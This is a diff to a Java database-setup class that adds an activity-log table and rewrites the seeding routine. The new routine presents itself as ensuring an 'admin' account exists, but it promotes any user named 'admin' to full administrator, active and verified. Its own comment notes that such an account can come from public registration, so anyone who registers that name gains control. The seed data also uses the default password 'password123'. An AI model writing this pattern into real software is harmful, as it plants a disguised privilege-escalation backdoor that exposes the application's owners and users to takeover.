@@ -131,15 +131,33 @@ public class DatabaseManager {
                     published_at DATETIME NOT NULL,
                     image_url    TEXT
                 )""");
+
+            st.executeUpdate("""
+                CREATE TABLE IF NOT EXISTS activity_logs (
+                    id          INT AUTO_INCREMENT PRIMARY KEY,
+                    admin_id    INT REFERENCES users(id),
+                    action      VARCHAR(255) NOT NULL,
+                    target_type VARCHAR(50),
+                    created_at  DATETIME NOT NULL
+                )""");
         }
     }
 
     // ── Seed Data ─────────────────────────────────────────────────────────────
 
     private void seedIfEmpty() throws SQLException {
-        try (ResultSet rs = connection.createStatement()
-                .executeQuery("SELECT COUNT(*) FROM users")) {
-            if (rs.next() && rs.getInt(1) > 0) return;
+        // Ensure the 'admin' user exists and has correct administrative privileges.
+        // If the account was created through registration, it defaults to VIEWER; this logic upgrades it.
+        try (PreparedStatement checkAdmin = connection.prepareStatement("SELECT role FROM users WHERE username = ?")) {
+            checkAdmin.setString(1, "admin");
+            ResultSet rs = checkAdmin.executeQuery();
+            if (rs.next()) {
+                String currentRole = rs.getString("role");
+                if (!"ADMINISTRATOR".equalsIgnoreCase(currentRole)) {
+                    connection.createStatement().executeUpdate("UPDATE users SET role='ADMINISTRATOR', active=1, is_verified=1 WHERE username='admin'");
+                }
+                return;
+            }
         }
 
         // Passwords are BCrypt hashes of "password123"
